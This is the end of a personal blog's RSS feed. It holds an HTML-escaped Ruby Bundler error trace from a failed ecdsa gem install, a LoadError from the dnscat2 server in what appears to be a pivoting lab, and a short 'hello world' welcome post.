&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/source/rubygems.rb:484:in &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;download_gem&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/source/rubygems.rb:446:in `fetch_gem&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/source/rubygems.rb:430:in
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;fetch_gem_if_possible&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/source/rubygems.rb:160:in `install&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/installer/gem_installer.rb:54:in &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;install&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/installer/gem_installer.rb:16:in
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`install_from_spec&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/installer/parallel_installer.rb:156:in
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;do_install&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/installer/parallel_installer.rb:147:in `block
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;in worker_pool&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/worker.rb:62:in &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;apply_func&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/worker.rb:57:in `block in process_queue&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/worker.rb:54:in &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;loop&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/worker.rb:54:in `process_queue&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/worker.rb:90:in &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;block &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; levels&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; in
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;create_threads&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;An error occurred &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; installing ecdsa &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1.2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, and Bundler cannot &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In Gemfile:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  ecdsa
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;New window created: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in require&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: cannot load such file -- ecdsa (LoadError) 	from &amp;lt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&amp;gt;:85:in require&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;from /home/wav/academy/pivot/dnsp/dnscat2/server/controller/encryptor.rb:10:in &amp;lt;top &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;required&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 	from &amp;lt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&amp;gt;:85:in require&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;from internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in require&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 	from /home/wav/academy/pivot/dnsp/dnscat2/server/controller/session.rb:10:in &amp;lt;top (required)&amp;gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;from internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in require&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 	from &amp;lt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&amp;gt;:85:in require&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;from /home/wav/academy/pivot/dnsp/dnscat2/server/controller/controller.rb:13:in &amp;lt;top &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;required&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 	from &amp;lt;internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb&amp;gt;:85:in require&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;from internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb:85:in require&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; 	from dnscat2.rb:20:in &amp;lt;main&amp;gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>hello world!</title>
      <link>https://peroxidee.github.io/posts/mypost/</link>
      <pubDate>Mon, 25 Sep 2023 13:57:47 -0500</pubDate>
      
      <guid>https://peroxidee.github.io/posts/mypost/</guid>
      <description>hello world! welcome to peroxidee.global, my blog for updating you on all sorts of my activities.</description>
      <content>&lt;p&gt;hello world! welcome to peroxidee.global, my blog for updating you on all sorts of my activities.&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
